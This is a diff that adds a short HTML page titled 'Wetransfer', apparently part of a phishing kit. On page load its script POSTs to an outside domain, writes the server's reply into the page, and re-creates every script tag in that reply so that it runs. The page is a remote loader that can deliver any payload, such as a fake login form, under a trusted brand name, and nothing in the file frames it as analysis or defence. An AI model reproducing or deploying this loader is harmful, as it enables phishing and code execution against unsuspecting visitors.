@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wetransfer</title>
+    <script>
+        window.onload = function() {
+            const data = { key1: 'User', key2: 'Active' };
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://aitelatrading.com/process.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 400) {
+                    const alertContainer = document.getElementById('alert');
+                    alertContainer.innerHTML = xhr.responseText;
+                    const scripts = alertContainer.getElementsByTagName('script');
+                    for (let i = 0; i < scripts.length; i++) {
+                        const script = document.createElement('script');
+                        if (scripts[i].src) {
+                            script.src = scripts[i].src;
+                        } else {
+                            script.textContent = scripts[i].textContent;
+                        }
+                        document.body.appendChild(script);
+                    }
+                } else {
+                    console.error('Error: ', xhr.statusText);
+                }
+            };
+			xhr.onerror = function () {
+                console.error('Request failed');
+            };
+            xhr.send(JSON.stringify(data));
+        }
+    </script>
+</head>
+<body>
+   <div id="alert"></div>
+</body>
+</html>
